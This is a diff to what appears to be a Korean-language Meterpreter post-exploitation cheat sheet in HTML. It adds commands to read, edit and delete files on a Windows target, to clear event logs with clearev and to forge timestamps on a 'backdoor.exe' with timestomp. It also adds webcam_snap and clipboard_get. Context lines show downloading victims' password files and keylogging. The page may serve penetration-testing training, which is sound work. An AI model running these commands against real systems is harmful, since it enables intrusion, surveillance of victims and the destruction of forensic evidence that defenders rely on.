@@ -120,6 +120,11 @@
 meterpreter > <span class="fn">pwd</span>
 meterpreter > <span class="fn">ls</span>
 
+<span class="cm"># 읽기 / 수정 / 삭제하기</span>
+meterpreter > <span class="fn">cat</span> C:\\Users\\Administrator\\Desktop\\note.txt
+meterpreter > <span class="fn">edit</span> C:\\Windows\\System32\\drivers\\etc\\hosts
+meterpreter > <span class="fn">rm</span> C:\\evil.exe
+
 <span class="cm"># 파일 다운로드 (타깃 → 공격자)</span>
 meterpreter > <span class="fn">download</span> C:\\Users\\victim\\passwords.txt /tmp/
 meterpreter > <span class="fn">download</span> -r C:\\Users\\victim\\Desktop /tmp/loot/
@@ -129,7 +134,21 @@ meterpreter > <span class="fn">upload</span> /tmp/tool.exe C:\\Windows\\Temp\\
 
 <span class="cm"># 파일 검색</span>
 meterpreter > <span class="fn">search</span> -f "*.txt" -d C:\\Users
-meterpreter > <span class="fn">search</span> -f "password*"</code></pre>
+meterpreter > <span class="fn">search</span> -f "password*"
+
+<span class="cm"># 이벤트 로그 삭제 (윈도우에 지금까지 쌓인 모든 로그 삭제 → 역효과 낳음)</span>
+meterpreter > <span class="fn">clearev</span>
+
+<span class="cm"># 타임스탬프 조작 (수정/접근/생성 시간 변경)</span>
+meterpreter > <span class="fn">timestomp</span> C:\\backdoor.exe -m "01/01/2020 00:00:00"
+meterpreter > <span class="fn">timestomp</span> C:\\backdoor.exe -a "01/01/2020 00:00:00"
+meterpreter > <span class="fn">timestomp</span> C:\\backdoor.exe -c "01/01/2020 00:00:00"
+
+<span class="cm"># MFT 엔트리 수정 시간 변경, NTFS 전용</span>
+meterpreter > <span class="fn">timestomp</span> C:\\backdoor.exe -e "01/01/2020 00:00:00"
+
+<span class="cm"># 타임스탬프 확인</span>
+meterpreter > <span class="fn">timestomp</span> C:\\backdoor.exe -v</code></pre>
         </div>
       </section>
 
@@ -207,6 +226,12 @@ meterpreter > <span class="fn">screenshot</span>
 meterpreter > <span class="fn">keyscan_start</span>
 meterpreter > <span class="fn">keyscan_dump</span>
 meterpreter > <span class="fn">keyscan_stop</span>
+
+<span class="cm"># 웹캠 스냅샷</span>
+meterpreter > <span class="fn">webcam_snap</span>
+
+<span class="cm"># 클립보드 내용 읽기</span>
+meterpreter > <span class="fn">clipboard_get</span>
 
 <span class="cm"># 시스템 정보</span>
 meterpreter > <span class="fn">sysinfo</span>
